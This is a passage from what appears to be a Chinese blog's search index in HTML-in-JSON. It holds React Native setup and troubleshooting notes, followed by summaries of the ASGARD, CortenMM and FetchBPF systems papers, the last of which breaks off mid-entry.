&quot;^6.0.10&quot;,</span><br><span class=\"line\">&quot;@react-navigation/stack&quot;: &quot;^6.2.1&quot;,</span><br></pre></td></tr></table></figure>\n<p>有如下依赖包</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"code\"><pre><span class=\"line\">&quot;react-native-gesture-handler&quot;: &quot;^2.5.0&quot;,</span><br><span class=\"line\">&quot;react-native-safe-area-context&quot;: &quot;^4.3.1&quot;,</span><br><span class=\"line\">&quot;react-native-safe-area-view&quot;: &quot;^1.1.1&quot;,</span><br><span class=\"line\">&quot;react-native-screens&quot;: &quot;3.13.1&quot;</span><br></pre></td></tr></table></figure>\n<h3 id=\"本地存储\"><a href=\"#本地存储\" class=\"headerlink\" title=\"本地存储\"></a>本地存储</h3><p><code>&quot;@react-native-community/async-storage&quot;: &quot;^1.12.1&quot;</code></p>\n<h3 id=\"antd\"><a href=\"#antd\" class=\"headerlink\" title=\"antd\"></a>antd</h3><p>antd-mobile不支持react native 换一个支持的</p>\n<p><a href=\"https://github.com/ant-design/ant-design-mobile-rn\">https://github.com/ant-design/ant-design-mobile-rn</a></p>\n<p><a href=\"https://rn.mobile.ant.design/\">https://rn.mobile.ant.design/</a></p>\n<p><code>&quot;@ant-design/react-native&quot;: &quot;5.0.0&quot;</code></p>\n<p>依赖包(issue中发现)<br><code>npm install classnames rc-util fbjs</code></p>\n<p>但实际上移动端的antd实现的组件并不如web端那么丰富，很多时候react-native自带的组件已经挺不错了</p>\n<h3 id=\"webrtc\"><a href=\"#webrtc\" class=\"headerlink\" title=\"webrtc\"></a>webrtc</h3><p><a href=\"https://github.com/react-native-webrtc/react-native-webrtc\">https://github.com/react-native-webrtc/react-native-webrtc</a></p>\n<p>下这个包会很慢，需要耐心等</p>\n<p>启动有问题，不报任何错误 在issue中找到解决方法，修改安卓文件配置即可</p>\n<p><a href=\"https://github.com/react-native-webrtc/react-native-webrtc/issues/1080\">https://github.com/react-native-webrtc/react-native-webrtc/issues/1080</a></p>\n<p>针对安卓的权限问题解决如下</p>\n<p><a href=\"https://github.com/react-native-webrtc/react-native-webrtc/blob/master/Documentation/AndroidInstallation.md\">https://github.com/react-native-webrtc/react-native-webrtc/blob/master/Documentation/AndroidInstallation.md</a></p>\n<h3 id=\"simple-peer\"><a href=\"#simple-peer\" class=\"headerlink\" title=\"simple peer\"></a>simple peer</h3><p><a href=\"https://github.com/feross/simple-peer\">https://github.com/feross/simple-peer</a></p>\n<p>simple-peer并没有说是支持移动端的，但是可以根据如下方法直接使用<br><a href=\"https://stackoverflow.com/questions/66281342/simple-peer-with-react-native-webrtc\">https://stackoverflow.com/questions/66281342/simple-peer-with-react-native-webrtc</a></p>\n<p>遇到的问题在于，react-native-webrtc中的RTCPeerConnection还没有实现很多API，因此在使用的时候会直接报错。</p>\n<p><a href=\"https://github.com/react-native-webrtc/react-native-webrtc/pull/1160\">https://github.com/react-native-webrtc/react-native-webrtc/pull/1160</a><br>此PR增加API 但仍在开发中</p>\n<p>若此后遇到问题，可尝试更换框架为peerjs</p>\n<p><a href=\"https://github.com/Zemke/react-native-peerjs\">https://github.com/Zemke/react-native-peerjs</a></p>\n<p><a href=\"https://peerjs.com/docs/#api\">https://peerjs.com/docs/#api</a></p>\n<h3 id=\"crypto\"><a href=\"#crypto\" class=\"headerlink\" title=\"crypto\"></a>crypto</h3><p><a href=\"https://github.com/tradle/react-native-crypto\">https://github.com/tradle/react-native-crypto</a></p>\n<p>最后一句换成<code>node_modules\\.bin\\rn-nodeify --hack --install --legacy-peer-deps</code><br>默认的crypto库的方法是基于浏览器内核的，在react-native项目中会报错(例如randomBytes)，使用react-native-randombytes并不能直接解决问题。</p>\n<p>安装react-native-crypto后根据教程进行配置，可以使其替代原有的crypto而不用修改其他库的源代码。(simple-peer中实例化Peer遇到此问题)</p>\n<p>之后package.json中会出现很多奇奇怪怪的包</p>\n<h2 id=\"一些错误\"><a href=\"#一些错误\" class=\"headerlink\" title=\"一些错误\"></a>一些错误</h2><p>出现任何错误 通用解决方案：</p>\n<ol>\n<li>重启metro</li>\n<li>node_modules删了再装</li>\n<li>重启电脑</li>\n</ol>\n<ul>\n<li><pre><code>npm ERR! Error: read ECONNRESET\nnpm ERR!     at TLSWrap.onStreamRead (node:internal/stream_base_commons:217:20) &#123;\nnpm ERR!   errno: -4077,\nnpm ERR!   code: &#39;ECONNRESET&#39;,\nnpm ERR!   syscall: &#39;read&#39;\nnpm ERR! &#125;\n</code></pre>\n<p>这个是网络不好 可以多试几次  或者用cnpm 或者换源</p>\n</li>\n<li><p><code>could not get batchedbridge</code> 重启metro</p>\n</li>\n<li><p><code>Invariant Violation: Module AppRegistry is not a registered callable module (calling runApplication)</code>重启metro</p>\n</li>\n<li><p><code>npm ERR! could not determine executable to run</code>仔细看命令 npm莫名其妙会变成npx</p>\n</li>\n<li><p><code>module could not be found within the project or in these directories:node_modules</code> 重启metro 如果不行删了node_modules再装</p>\n</li>\n<li><p><code>warn No apps connected. Sending &quot;reload&quot; to all React Native apps failed. Make sure your app is running in the simulator or on a phone connected via USB. info Reloading app...</code><br>这个的原因是app本身有问题 导致一打开就会闪退 或者其他原因根本打不开 和模拟器的连接没有问题  但是找不到任何报错的信息 因此只能控制变量去看;<br>少装几个包就没这个问题了 因此是装了的包 即使代码里没有用 也会导致这个问题;具体是react-native-webrtc要求安卓的minSdkVersion 需要修改android目录下的配置文件</p>\n</li>\n<li><p><code>&#39;react-native&#39; 不是内部或外部命令，也不是可运行的程序 或批处理文件。</code>这个可能是uninstall的时候多删东西了 直接<code>npm install</code>就行</p>\n</li>\n<li><p><code>TypeError: undefined is not an object (evaluating &#39;process.version.split&#39;)</code>这个问题并没有解决</p>\n<p><a href=\"https://github.com/facebook/react-native/issues/30654\">https://github.com/facebook/react-native/issues/30654</a></p>\n</li>\n</ul>\n<h2 id=\"待解决的问题\"><a href=\"#待解决的问题\" class=\"headerlink\" title=\"待解决的问题\"></a>待解决的问题</h2><ul>\n<li><p>使用路由后导致页面卡死</p>\n</li>\n<li><p>某些手机下载软件后网络请求错误  可能是手机版本导致禁用了http 可能https可以解决</p>\n<p><a href=\"https://blog.csdn.net/qq_32312317/article/details/80868118\">React Native: TypeError: Network request failed_翻船现场的博客-CSDN博客</a></p>\n<p><a href=\"https://github.com/facebook/react-native/issues/32931\">HTTP Fetch fails with “TypeError: Network request failed” &#x3D;&gt; Resolved · Issue #32931 · facebook&#x2F;react-native (github.com)</a></p>\n</li>\n</ul>\n","categories":["misc"]},{"title":"ASGARD Protecting On-Device Deep Neural Networks with Virtualization-Based Trusted Execution Environments","url":"/2026/02/02/papers/ASGARD%20Protecting%20On-Device%20Deep%20Neural%20Networks%20with%20Virtualization-Based%20Trusted%20Execution%20Environments/","content":"<h1 id=\"ASGARD-Protecting-On-Device-Deep-Neural-Networks-with-Virtualization-Based-Trusted-Execution-Environments\"><a href=\"#ASGARD-Protecting-On-Device-Deep-Neural-Networks-with-Virtualization-Based-Trusted-Execution-Environments\" class=\"headerlink\" title=\"ASGARD Protecting On-Device Deep Neural Networks with Virtualization-Based Trusted Execution Environments\"></a>ASGARD Protecting On-Device Deep Neural Networks with Virtualization-Based Trusted Execution Environments</h1><p>NDSS’25</p>\n<p><img src=\"/images/Lw9ibvD97odiC0xCDuXc2lGanG7.png\" title=\"image\"></p>\n<p>针对端侧 DNN 模型的隔离环境</p>\n<h2 id=\"Background\"><a href=\"#Background\" class=\"headerlink\" title=\"Background\"></a>Background</h2><p>DNN 模型隐私保护</p>\n<ul>\n<li>保护知识产权</li>\n<li>保护训练数据信息</li>\n</ul>\n<p>现有 TEE 方案（TrustZone）的缺陷：</p>\n<ul>\n<li>内存有限</li>\n<li>无法安全访问加速器（部分卸载到 REE 则会容易被攻击，加密或混淆则开销大）</li>\n<li>需要 TEE-OS，与加速器软件栈不兼容</li>\n</ul>\n<p><img src=\"/images/MZNUbBMoOojtGIxJhFTcqPMDnqc.png\" title=\"image\"></p>\n<h2 id=\"Design-Goal\"><a href=\"#Design-Goal\" class=\"headerlink\" title=\"Design Goal\"></a>Design Goal</h2><p>本工作提出 ASGARD：</p>\n<ul>\n<li>虚拟化隔离（pkvm）</li>\n<li>加速器直通给虚拟机 （VFIO）</li>\n<li>改 EL2 不改 EL3</li>\n<li>Guest 用 Linux 加速器驱动不需要改</li>\n</ul>\n<p>问题和挑战：</p>\n<ol>\n<li>基于虚拟化的 TEE 方案没有安全 IO 直通的方案</li>\n<li>IOMMU 驱动和依赖都在 TCB</li>\n<li>虚拟化给推理带来性能影响</li>\n</ol>\n<p><img src=\"/images/Hje7bPCx7oJ7SJxulvncH4XTnig.png\" title=\"image\"></p>\n<ol>\n<li>启动平台 验证（pkvm）</li>\n<li>启动 enclave  （pkvm）</li>\n<li>DNN 模型配置 （理论上需要加解密 但是本工作没有涉及）</li>\n<li>加速器分配 （配置 MMU 与 IOMMU 页表）</li>\n<li>DNN 推理服务 （通过 vsock 和共享内存通信）</li>\n</ol>\n<p><img src=\"/images/CN2sb3Rafon5VbxyKqrcEduonFb.png\" title=\"image\"></p>\n<p>EL2 的 TEEvisor 保证：</p>\n<ol>\n<li>对于 NPU 的访问必须经过授权，未经授权的 Host 无法直接通过 NPU 接口来窃取数据。</li>\n<li>NPU 对 enclave memory 的访问必须经过授权，当 Host 占有 NPU 时无法通过 IOMMU 访问 enclave 内存</li>\n</ol>\n<h2 id=\"Design-Details-Evaluation\"><a href=\"#Design-Details-Evaluation\" class=\"headerlink\" title=\"Design Details &amp; Evaluation\"></a>Design Details &amp; Evaluation</h2><ul>\n<li>RK3588S （Armv8.2-A SoC  RockchipNPU）</li>\n<li>PKVM</li>\n</ul>\n<h3 id=\"Secure-Accelerator-I-O-Passthrough\"><a href=\"#Secure-Accelerator-I-O-Passthrough\" class=\"headerlink\" title=\"Secure Accelerator I&#x2F;O Passthrough\"></a>Secure Accelerator I&#x2F;O Passthrough</h3><p>安全保证：</p>\n<ul>\n<li>有且仅有 TEEVisor 对敏感接口有控制权</li>\n<li>加速器任何时刻只分给一个 enclave</li>\n<li>enclave 使用完后，加速器无残留状态和数据</li>\n</ul>\n<p>TEEvisor 保证控制：</p>\n<ul>\n<li>stage2 MMU</li>\n<li>所有 IOMMU 的寄存器地址范围</li>\n<li>加速器敏感接口</li>\n</ul>\n<p>Guest 需要用或者释放 NPU 的时候 hypercall 到 pkvm EL2 会执行 flush iotlb 等操作</p>\n<p>加速器使用过程：</p>\n<ul>\n<li>初始化：配置所有 IOMMU，只有加速器的 IOMMU 可以访问 enclave 内存；enclave 访问加速器 MMIO 区域</li>\n<li>切换：重新配置 MMU IOMMU  需要刷 tlb  iotlb。需要加速器设备支持 reset 接口</li>\n<li>回收：REE 可以任意时候回收，TEE 清除数据 改 enclave stage2 页表 IOMMU 页表</li>\n</ul>\n<p>切换开销：</p>\n<p><img src=\"/images/SJB1bh04lomsKvxQueHcckHWnth.png\" title=\"image\"></p>\n<p>推理 latency（224x224 图像分类任务）</p>\n<p><img src=\"/images/DXJjb5Sejo5TauxPlbvcnSKknIc.png\" title=\"image\"></p>\n<ul>\n<li>TrustZone 方案需要混淆，性能差</li>\n<li>ASGARD 对 REE 方案 overhead 只有 2.01%</li>\n</ul>\n<h3 id=\"TCB-and-Attack-Surface-Reduction\"><a href=\"#TCB-and-Attack-Surface-Reduction\" class=\"headerlink\" title=\"TCB and Attack Surface Reduction\"></a>TCB and Attack Surface Reduction</h3><ul>\n<li>IOMMU 电源 时钟管理给 REEVisor。当 REE 关闭 IOMMU 对应的设备自动关了 不会绕过</li>\n<li>不需要 guest kernel 中的其他进程间隔离方案，禁用 Seccomp SELinux</li>\n<li>去掉没用的 kernel features 定制 rootfs ，大部份 busybox 的可执行文件是不需要的</li>\n</ul>\n<p><img src=\"/images/Fnrobkqato9TGhxykq8czlBsnab.png\" title=\"image\"></p>\n<h3 id=\"DNN-Inference-Latency-Optimization\"><a href=\"#DNN-Inference-Latency-Optimization\" class=\"headerlink\" title=\"DNN Inference Latency Optimization\"></a>DNN Inference Latency Optimization</h3><p>CPU-fallback operations 当加速器不支持此算子 会通过触发中断 -&gt;  vmexit 很慢</p>\n<p><img src=\"/images/X52EblqVAoZ2TWxgCVYcW7Zznde.png\" title=\"image\"></p>\n<p>优化方案：分析计算图 把不存在依赖的需要 fallback 的算子集中到一起 用一个 vm exit</p>\n<p>把原来的计算图拆成一个个子图 每个子图要么全是不需要 fallback 的 要么全是需要 fallback 的 这样一个子图只需要 fallback 一次</p>\n<p><img src=\"/images/LUCrb5EHYoUe0FxE13Vcj5rtnIc.png\" title=\"image\"></p>\n<p>多个 fallback 算子没有依赖，但是由于默认 DFS 执行的顺序，会先后执行。可以切分子图，把这些没有依赖的 fallback 划分到一个子图里</p>\n<figure class=\"highlight python\"><table><tr><td class=\"code\"><pre><span class=\"line\">searchflag = no-fallback<span class=\"comment\"># fallback</span></span><br><span class=\"line\">G1 = &#123;&#125;</span><br><span class=\"line\"><span class=\"keyword\">while</span> G:</span><br><span class=\"line\">    P = &#123;&#125;</span><br><span class=\"line\">    <span class=\"keyword\">while</span> V = G(indegree=<span class=\"number\">0</span>,fallback=searchflag):</span><br><span class=\"line\">        p += V</span><br><span class=\"line\">        G = G \\ V</span><br><span class=\"line\">    G1 += P</span><br><span class=\"line\">    searchflag = !searchflag</span><br></pre></td></tr></table></figure>\n\n<p>具体实现上：</p>\n<p>rknn 的编译器和 runtime 都是闭源的，所以计算图是静态划分的，分成多个.rknn model 文件</p>\n<p>需要在推理框架中手动初始化各个模型文件 并且分开推理 然后整合中间数据</p>\n<ul>\n<li>NPU 调 rknn_run</li>\n<li>CPU 调 TensorFlow Lite runtime</li>\n</ul>\n<p><img src=\"/images/LBTNbklO3oNOnKxY596cgpufn3r.png\" title=\"image\"></p>\n<p>input：16 tokens，执行一次生成过程，统计 latency</p>\n<p><img src=\"/images/DYwbbXAejo05iuxDC9DcXVgBnbc.png\" title=\"image\"></p>\n<p>对 REE 来说，一次推理需要 1ms，遇到 38 次 fallback 中断。</p>\n<p>对 ASAGARD 38*0.03&#x3D;1.14ms 和推理时间一个量级</p>\n<p><img src=\"/images/KANibqMfcoZmkyxwRZ7cWJLmnLb.png\" title=\"image\"></p>\n<p>观察内存的使用，exit-coalescing 的优化并不会对内存占用产生负面影响（峰值相同）</p>\n<h2 id=\"Conclusion\"><a href=\"#Conclusion\" class=\"headerlink\" title=\"Conclusion\"></a>Conclusion</h2><ul>\n<li>提出 NPU 安全直通方案，主要是由 TEEvisor 进行 MMIOregion 和页表的切换</li>\n<li>识别出 DNN 推理过程中虚拟化带来的开销来源（CPU-fallback 算子导致的 vm-exit），并通过划分计算子图的方式进行优化。</li>\n</ul>\n","categories":["papers"]},{"title":"CortenMM: Efficient Memory Management with Strong Correctness Guarantees","url":"/2026/02/02/papers/CortenMM%20Efficient%20Memory%20Management%20with%20Strong%20Correctness%20Guarantees/","content":"<h1 id=\"CortenMM-Efficient-Memory-Management-with-Strong-Correctness-Guarantees\"><a href=\"#CortenMM-Efficient-Memory-Management-with-Strong-Correctness-Guarantees\" class=\"headerlink\" title=\"CortenMM: Efficient Memory Management with Strong Correctness Guarantees\"></a>CortenMM: Efficient Memory Management with Strong Correctness Guarantees</h1><p><img src=\"/images/YeKsbBKfiogZegxUDSac0ZrUndZ.png\" title=\"image\"></p>\n<p>SOSP‘25 Best Paper</p>\n<h2 id=\"Background\"><a href=\"#Background\" class=\"headerlink\" title=\"Background\"></a>Background</h2><h3 id=\"VMA\"><a href=\"#VMA\" class=\"headerlink\" title=\"VMA\"></a>VMA</h3><p>内存管理上 Linux 采用 VMA+ 页表的两层抽象，在内存操作上需要两种类型的锁，限制了可扩展性</p>\n<p><img src=\"/images/O8nkbhZW8oBqMvxkM0dcqqdgnOl.png\" title=\"image\"></p>\n<p><img src=\"/images/ZtSqbl2kVor08jxOHdBcMgTSnRd.png\" title=\"image\"></p>\n<ul>\n<li>可扩展性差</li>\n<li>并发 Bug 多（CVE）</li>\n</ul>\n<p><img src=\"/images/RRjdbAp1Coh2lXxf606cYY7gn6f.png\" title=\"image\"></p>\n<ul>\n<li>两个地址范围不相交的 page fault 在页表层面不存在冲突，但是如果处于同一段 VMA 中 就会因为抢 VMA 锁导致竞争</li>\n<li>Real-world application 中存在各种 mmap mprotect 的调用 比较复杂</li>\n</ul>\n<h3 id=\"Asterinas\"><a href=\"#Asterinas\" class=\"headerlink\" title=\"Asterinas\"></a>Asterinas</h3><p>星绽操作系统</p>\n<p><img src=\"/images/MLQHbKAZrosPGqxIiG5cC9Ypnsd.png\" title=\"image\"></p>\n<p><img src=\"/images/EDwPb7CLMoODR8xHmVDcF8ojnvg.png\" title=\"image\"></p>\n<p><img src=\"/images/C7FUbOBBaoDSBxx6VoWcZHnnnDg.png\" title=\"image\"></p>\n<h2 id=\"Design\"><a href=\"#Design\" class=\"headerlink\" title=\"Design\"></a>Design</h2><p>Key insight：</p>\n<ol>\n<li>两层抽象的设计是由于历史原因，目前大部分现代 ISA 和 MMU 采用相似的多级页表设计</li>\n<li>为了实现 On-demand paging COW swap 等高级的内存管理语义，并不需要多一层抽象</li>\n</ol>\n<p><img src=\"/images/SLvXbYraFo5mESx0SD2cItNjnPd.png\" title=\"image\"></p>\n<ul>\n<li>通过页表页的物理地址 可以找到 page descriptor</li>\n<li>有且仅有每个页表页存在锁</li>\n<li>通过 page descriptor 找到 per-PTE 的 metadata array 存放其他信息</li>\n</ul>\n<p>从这个设计上能做的简单推论：</p>\n<ol>\n<li>锁的粒度变细（2M 粒度） 可扩展性变好</li>\n<li>On-demand paging 需要复制整个页表 会比复制 VMA 慢 （mmap &#x2F; fork）</li>\n</ol>\n<h3 id=\"Lock-protocol\"><a href=\"#Lock-protocol\" class=\"headerlink\" title=\"Lock protocol\"></a>Lock protocol</h3><p>CortenMM-rw 读写锁：在遍历页表的过程中拿读锁 找到对应的页表页以后拿写锁</p>\n<p><img src=\"/images/Ios8bgizooEsrlxhL6Ac6cVRnXc.png\" title=\"image\"></p>\n<p>读锁之间仍然有竞争（原子变量）</p>\n<p>CoartenMM-adv：RCU+ 互斥锁</p>\n<p>遍历页表的时候不加锁 只记录 RCU 状态</p>\n<p><img src=\"/images/NRqpbc07Coyw96xeT3HcGFqrnSc.png\" title=\"image\"></p>\n<h3 id=\"内存接口实现\"><a href=\"#内存接口实现\" class=\"headerlink\" title=\"内存接口实现\"></a>内存接口实现</h3><p><img src=\"/images/ULtvbZuVdoee5PxRMZWcG78GnJe.png\" title=\"image\"></p>\n<p><img src=\"/images/VbIPbc2XwoQML9xDSsicx0WfnNg.png\" title=\"image\"></p>\n<h2 id=\"Verification\"><a href=\"#Verification\" class=\"headerlink\" title=\"Verification\"></a>Verification</h2><p>用 Verus(半自动的基于 SMT 的验证器) 进行形式化验证</p>\n<ol>\n<li>locking protocol 正确，即 两个线程并发访问范围相交的地址 不可能同时拿到锁</li>\n<li>对页表的修改正确（map unmap mark），并且页表结构正确（始终处于合法状态）</li>\n</ol>\n<p><img src=\"/images/UOndbwNRPo9wJPxplq5cpD9NnSf.png\" title=\"image\"></p>\n<h2 id=\"Evaluation\"><a href=\"#Evaluation\" class=\"headerlink\" title=\"Evaluation\"></a>Evaluation</h2><ul>\n<li>AMD EPYC 9965</li>\n<li>192-core CPU * 2 &#x3D; 384 cores</li>\n<li>512GB DRAM * 2 &#x3D; 1T</li>\n</ul>\n<h3 id=\"microbenchmark\"><a href=\"#microbenchmark\" class=\"headerlink\" title=\"microbenchmark\"></a>microbenchmark</h3><p><img src=\"/images/Rkuvbyvcxo6zaSx5OPTczO2xn5e.png\" title=\"image\"></p>\n<p>单线程</p>\n<p><img src=\"/images/Cjs0b1D5QoY1hwxu5s6cGerznFh.png\" title=\"image\"></p>\n<ul>\n<li>Linux 只需要创建 VMA</li>\n<li>Cortenmm 需要分配、创建页表页</li>\n</ul>\n<p>&#x3D;&gt; mmap 慢</p>\n<p>发生 page fault Linux 仍然需要创建页表</p>\n<p>&#x3D;&gt; mmap+PF 快</p>\n<p><img src=\"/images/HTbcbBqffo8kqBxZJ6kcTvwQnqg.png\" title=\"image\"></p>\n<ul>\n<li>Fork：-17.7%</li>\n<li>fork+exec ：+23%</li>\n</ul>\n<p>多线程</p>\n<ul>\n<li>low-contention:每个线程在私有内存区域上访问</li>\n<li>high-contention：每个线程在共享内存上随机访问</li>\n</ul>\n<p><img src=\"/images/GKXqbslSzo5hNlxoyVUculUYneb.png\" title=\"image\"></p>\n<ul>\n<li>cortenmm 几乎线性增长，384thread 情况下 PF 快 33 倍 unmap-virt 快 2270 倍</li>\n<li>Cortenmm 64thread 开始掉的原因：最后一层页表页发生竞争</li>\n</ul>\n<h3 id=\"Real-world-benchmark\"><a href=\"#Real-world-benchmark\" class=\"headerlink\" title=\"Real-world benchmark\"></a>Real-world benchmark</h3><p><img src=\"/images/WHqqbC1EioGradxjbXJcf5I3nEb.png\" title=\"image\"></p>\n<p>cortenmm 减少了并发情况下 application 在 page fault&#x2F;unmap&#x2F;mprotect 上的耗时</p>\n<p><img src=\"/images/JlEpb4LctonQi4xZj1hce95pnod.png\" title=\"image\"></p>\n<p>在某些应用场景下，使用更先进的内存分配器（tcmalloc） 可以大幅度提升 Linux 的可扩展性（通过减少对 unmap 等 syscall 的调用）</p>\n<p>但是使用 tcmalloc 会造成其他副作用 比如占用内存变多</p>\n<h2 id=\"Conclusion\"><a href=\"#Conclusion\" class=\"headerlink\" title=\"Conclusion\"></a>Conclusion</h2><p>CortenMM 简化了内存管理系统，摈弃了传统的 VMA，而使用单层抽象，同时提出了一种面向 MMU 编程的事务型接口，并配套设计了相应的加锁协议。这些加锁协议避免了在软件抽象层上产生不必要的竞争，在维持事务原子性的同时显著提升了性能和可扩展性。加锁协议和事务接口中的基本功能进行了形式化验证，从而提供了强有力的一致性保障。在真实世界基准测试中， CortenMM 性能比 Linux 高出 1.2 倍至 26 倍。</p>\n","categories":["papers"]},{"title":"FetchBPF: Customizable Prefetching Policies in Linux with eBPF","url":"/2025/02/04/papers/FetchBPF/","content":"<h1 id=\"FetchBPF-Customizable-Prefetching-Policies-in-Linux-with-eBPF\"><a href=\"#FetchBPF-Customizable-Prefetching-Policies-in-Linux-with-eBPF\" class=\"headerlink\" title=\"FetchBPF: Customizable Prefetching Policies in Linux with eBPF\"></a>FetchBPF: Customizable Prefetching Policies in Linux with eBPF</h1><p>ATC’24</p>\n<p><img src=\"https://h7dbgreydj.feishu.cn/space/api/box/stream/download/asynccode/?code=Mjg4YWYzNDI2Y2E2ZGNjZDliMDRhNTgwNTU1ZmZlMDJfWDFTczE1UVBzYkswT2dlQ3Y4ekdHUlhPUmp1MVpzNXJfVG9rZW46SFJSbGJyeEpBb2F1aVR4YzlEcWMzOHhabnJnXzE3Mzg2NzMwODk6MTczODY3NjY4OV9WNA\" alt=\"img\"></p>\n<p>基于eBPF设计了一个框架，使得用户可以定制自己的memory prefetch策略</p>\n<h2 id=\"背景\"><a href=\"#背景\" class=\"headerlink\" title=\"背景\"></a>背景</h2><p>linux的某些策略平均表现很好，但是很难在特定的情况下取得最好的性能。</p>\n<h3 id=\"Memory-prefetching\"><a href=\"#Memory-prefetching\" class=\"headerlink\" title=\"Memory prefetching\"></a>Memory prefetching</h3><p>内存压力大时，内存页会被swap out，之后需要用时，swap in会很慢</p>\n<p><img src=\"https://h7dbgreydj.feishu.cn/space/api/box/stream/download/asynccode/?code=NjZmOWIyOWFhNDg0NTRhMDhlNTZhZGRlMTIyM2M5N2RfODdJWE95ZW02M0dDaGdEREJSTzg5TzhYSHBicTFzRHJfVG9rZW46UXA2R2JhdzVEb2VjYkx4cTMzdWNvc0ZBblFoXzE3Mzg2NzMwODk6MTczODY3NjY4OV9WNA\" alt=\"img\"></p>\n<p>为了提高性能，操作系统会预测哪些swapped out的pages可能会被用到，prefetch这些pages</p>\n<p><img src=\"https://h7dbgreydj.feishu.cn/space/api/box/stream/download/asynccode/?code=ZjJkNGY3OGUzZDMyNDY4NDVlYTE4ZTc4OGE5MTIxNjhfZERmWmI3S001RXpLem5QdGFPVXRaUmtvU0NkMXNKckFfVG9rZW46R3RYcGJxNXFub2N2MGZ4alNxY2NJYlhKbnJmXzE3Mzg2NzMwODk6MTczODY3NjY4OV9WNA\" alt=\"img\"></p>\n<p>一个好的prefetch策略需要兼顾Accuracy与Coverage：</p>\n<ul>\n<li>Coverage：cache hits &#x2F; (cache hits + cache misses) 尽可能让之后可能发生的page fault的pages都被prefetch到</li>\n<li>Accuracy：cache hits &#x2F; prefetch pages 需要保证不能prefetch太多没用的page 反而拖慢了性能</li>\n</ul>\n<h4 id=\"Linux-default-prefetch-policy\"><a href=\"#Linux-default-prefetch-policy\" class=\"headerlink\" title=\"Linux default prefetch policy\"></a>Linux default prefetch policy</h4><ul>\n<li>只考虑sequantial pattern</li>\n<li>只看过去2个page fault，如果连续，则prefetch连续的后几个pages</li>\n</ul>\n<h4 id=\"SOTA-prefetch-policy\"><a href=\"#SOTA-prefetch-policy\" class=\"headerlink\" title=\"SOTA prefetch policy\"></a>SOTA prefetch policy</h4><ul>\n<li>LEAP：ATC‘20</li>\n<li>HoPP：HPCA‘23</li>\n</ul>\n<p><img src=\"https://h7dbgreydj.feishu.cn/space/api/box/stream/download/asynccode/?code=MWQ4M2EzZGE2MjU0Njc5NWY0MDRhOGFkMWVhNDg1NTJfRTVNY2dFZ241M3Z0Q2FIWmlIY2ljNWpaZlM3UDhVaDBfVG9rZW46T2lLbWJwa2VOb2FXQWR4Y0VmTWNxZkZSbnZiXzE3Mzg2NzMwODk6MTczODY3NjY4OV9WNA\" alt=\"img\"></p>\n<p><img src=\"https://h7dbgreydj.feishu.cn/space/api/box/stream/download/asynccode/?code=N2Y4NDdlZmJlMjI5Y2E0NzY4ZGZlOTJjMDU5ZmQ1NWFfZGl5cGF1MXB2WmVqbUdNcElWTjVQUGJNeEJub290N3BfVG9rZW46QXVlM2JDdnZZbzNHSzB4NlVOOWNZSllLblFiXzE3Mzg2NzMwODk6MTczODY3NjY4OV9WNA\" alt=\"img\"></p>\n<h4 id=\"motivation\"><a href=\"#motivation\" class=\"headerlink\" title=\"motivation\"></a>motivation</h4><p>不同allocation pattern和不同access pattern下 各个memory prefetch policy的性能表现</p>\n<p><img src=\"https://h7dbgreydj.feishu.cn/space/api/box/stream/download/asynccode/?code=MmI4MjIyYjk4ZjI5Yjc5YTRkMTE1NzJiY2JiOGFiYTJfUklQWFZpUkFJVjZmOXNNOVVrdWFDV3dkcEViQXhzdUhfVG9rZW46QWo3QmJaZGQ2b0hVZTl4YXVJS2N6Ykg0bkpoXzE3Mzg2NzMwODk6MTczODY3NjY4OV9WNA\" alt=\"img\"></p>\n<p>结论：没有一个policy会在任何条件下比其他的policy都好。需要最适合某个application，必须为这个application定制policy</p>\n<h3 id=\"eBPF\"><a href=\"#eBPF\" class=\"headerlink\" title=\"eBPF\"></a>eBPF</h3><blockquote>\n<p>eBPF 是一项革命性的技术，起源于 Linux 内核，它可以在特权上下文中（如操作系统内核）运行沙盒程序。它用于安全有效地扩展内核的功能，而无需通过更改内核源代码或加载内核模块的方式来实现。</p>\n</blockquote>\n<p><img src=\"https://h7dbgreydj.feishu.cn/space/api/box/stream/download/asynccode/?code=MzdhY2I4MzY3NTUwZGM1YjI1MDNjYjBlOTk3MjRmOTNfUlhRWnNGMnQyWGNnOFVPMWZ1a3hnY1EyMEplSWZLMFpfVG9rZW46VTU1Y2IzQVpHb0lTaUR4QlFMT2NDVXR0bjJjXzE3Mzg2NzMwODk6MTczODY3NjY4OV9WNA\" alt=\"img\"></p>\n<h2 id=\"Strawman-design\"><a href=\"#Strawman-design\" class=\"headerlink\" title=\"Strawman design\"></a>Strawman design</h2><p>改linux 实现多种prefetch policy ，根据历史的memory access pattern进行动态切换</p>\n<p>问题</p>\n<ol>\n<li>难以支持任意数量的policy</li>\n<li>很难存在一个特定的policy集合 可以适应所有的access pattern</li>\n<li>在linux中实现工程量大</li>\n<li>需要说服linux上游接受 需要耗费更多精力和时间</li>\n</ol>\n<h2 id=\"Design-and-implementation\"><a href=\"#Design-and-implementation\" class=\"headerlink\" title=\"Design and implementation\"></a>Design and implementation</h2><p><img src=\"https://h7dbgreydj.feishu.cn/space/api/box/stream/download/asynccode/?code=MjFmMTBhNDY2NWIxOGUyNGQ3MjUxMmMwM2ZlOWI2YjNfU3NrQ3ptdTI5MjhoQW96RVBtWXZkNVBmY3h3dTZmVXVfVG9rZW46U3BmTmJzRjFXb2N5cDF4MkNPZmNBWFpmbkplXzE3Mzg2NzMwODk6MTczODY3NjY4OV9WNA\" alt=\"img\"></p>\n<h3 id=\"eBPF-Hook\"><a href=\"#eBPF-Hook\" class=\"headerlink\" title=\"eBPF Hook\"></a>eBPF Hook</h3><ul>\n<li>(A)prefetch_stats：page fault时触发，用于记录fault pages的历史信息，便于policy找到access pattern</li>\n<li>(B)prefetch_policy：执行prefetch policy时触发，需要根据算法找到需要prefetch的pages并且请求prefetch 这些pages</li>\n</ul>\n<h3 id=\"Helper-Functions\"><a href=\"#Helper-Functions\" class=\"headerlink\" title=\"Helper Functions\"></a>Helper Functions</h3><ul>\n<li>(1)bpf_prefetch_physical_page：根据物理地址发出I&#x2F;O请求</li>\n<li>(2)bpf_prefetch_virtual_page：根据虚拟地址发出I&#x2F;O请求</li>\n<li>(3)bpf_&lt;start&#x2F;stop&gt;_block_plug：选择性batch上两个接口发出的I&#x2F;O请求</li>\n</ul>\n<p><img 